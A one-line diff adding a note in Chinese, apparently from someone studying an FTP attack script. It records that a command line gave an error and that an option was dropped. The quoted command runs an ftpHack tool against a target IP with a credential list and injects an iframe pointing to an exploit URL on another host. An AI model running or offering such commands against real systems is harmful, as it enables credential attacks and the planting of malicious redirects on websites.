@@ -1,0 +1,1 @@
+1、输入ftpHack.py -H 192.168.95.179 -r '<iframe src="http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt时cmd提示错误------已取消该选项
